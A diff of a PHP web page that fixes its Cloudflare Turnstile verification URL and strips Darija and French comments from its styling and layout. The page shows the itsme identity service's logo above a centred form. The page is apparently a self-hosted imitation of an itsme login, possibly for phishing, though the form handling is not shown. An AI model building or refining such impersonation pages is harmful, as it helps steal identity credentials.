@@ -19,7 +19,8 @@ if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST['cf-turnstile-response
         'remoteip' => $ip
     ];
     
-    $ch = curl_init("https://google.com");
+    // ← HADA HOWA L'URL S-SAHIH
+    $ch = curl_init("https://challenges.cloudflare.com/turnstile/v0/siteverify");
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
     curl_setopt($ch, CURLOPT_TIMEOUT, 10);
@@ -73,7 +74,6 @@ if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST['cf-turnstile-response
             overflow-x: hidden;
         }
 
-        /* ===== DEUX IMAGES F L'KHALFIYA ===== */
         .bg-images {
             position: fixed;
             top: 0;
@@ -84,7 +84,6 @@ if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST['cf-turnstile-response
             display: flex;
         }
 
-        /* Image 3la lisar */
         .bg-left {
             width: 50%;
             height: 100%;
@@ -94,7 +93,6 @@ if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST['cf-turnstile-response
             background-repeat: no-repeat;
         }
 
-        /* Image 3la limen */
         .bg-right {
             width: 50%;
             height: 100%;
@@ -104,9 +102,6 @@ if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST['cf-turnstile-response
             background-repeat: no-repeat;
         }
 
-        /* ← L'overlay orange t7ayed — les images nadfin */
-
-        /* ===== CONTAINER (FORM) ===== */
         .container {
             position: relative;
             z-index: 2;
@@ -277,10 +272,6 @@ if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST['cf-turnstile-response
             to { transform: rotate(360deg); }
         }
 
-        /* ============================================
-           RESPONSIVE DESIGN
-           ============================================ */
-
         @media (max-width: 992px) {
             .container {
                 max-width: 380px;
@@ -306,7 +297,7 @@ if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST['cf-turnstile-response
                 padding: 12px;
             }
             .bg-images {
-                flex-direction: column;   /* wa7da fou9 l'okhra f mobile */
+                flex-direction: column;
             }
             .bg-left,
             .bg-right {
@@ -363,13 +354,11 @@ if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST['cf-turnstile-response
     </style>
 </head>
 <body>
-    <!-- Deux images f l'khalﬁya — bla overlay orange -->
     <div class="bg-images">
         <div class="bg-left"></div>
         <div class="bg-right"></div>
     </div>
 
-    <!-- Form f l'weset -->
     <div class="container">
         <div class="logo">
             <img src="https://www.itsme-id.com/hubfs/Website%2025/Branding/Logo/itsme-logo.svg" alt="Logo">
